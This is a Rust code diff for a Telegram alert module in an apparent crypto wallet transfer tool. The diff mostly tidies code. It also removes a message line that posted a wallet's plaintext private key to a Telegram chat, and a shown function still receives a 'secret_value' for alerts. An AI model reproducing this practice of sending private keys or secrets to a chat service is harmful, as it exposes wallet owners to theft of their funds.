@@ -3,7 +3,6 @@ use crate::models::wallet::{TransferResult, WalletInfo};
 use teloxide::prelude::*;
 use teloxide::types::ParseMode;
 use std::sync::Arc;
-use chrono::Utc;
 use tracing::{info, warn};
 
 pub struct TelegramAlerts {
@@ -19,7 +18,6 @@ impl TelegramAlerts {
         Ok(Self { bot, chat_id })
     }
     
-    // Optional — agar env vars nahi hain to dummy return karo
     pub fn new_optional(config: Arc<Config>) -> Arc<Self> {
         match Self::new(config) {
             Ok(ta) => {
@@ -28,7 +26,6 @@ impl TelegramAlerts {
             }
             Err(e) => {
                 warn!("⚠️ Telegram init failed: {} — using dummy", e);
-                // Dummy with placeholder values
                 Arc::new(Self {
                     bot: Bot::new("dummy_token"),
                     chat_id: ChatId(0),
@@ -46,7 +43,7 @@ impl TelegramAlerts {
         secret_value: &str,
     ) {
         if self.chat_id.0 == 0 {
-            return; // Dummy mode
+            return;
         }
         
         let message = format!(
@@ -70,7 +67,8 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    pub async fn send_transfer_success(&self, wallet_info: &WalletInfo, transfer: &TransferResult) {
+    // FIX: wallet_info ko underscore lagaya (unused warning hatane ke liye)
+    pub async fn send_transfer_success(&self, _wallet_info: &WalletInfo, transfer: &TransferResult) {
         if self.chat_id.0 == 0 {
             return;
         }
@@ -83,14 +81,14 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    pub async fn send_transfer_failed(&self, wallet_info: &WalletInfo, error: &str) {
+    pub async fn send_transfer_failed(&self, _wallet_info: &WalletInfo, error: &str) {
         if self.chat_id.0 == 0 {
             return;
         }
         
         let message = format!(
-            "❌ TRANSFER FAILED!\nAddress: {}\nError: {}\nKey: `{}`",
-            wallet_info.address, error, wallet_info.private_key
+            "❌ TRANSFER FAILED!\nError: {}",
+            error
         );
         
         self.send_message(&message).await;
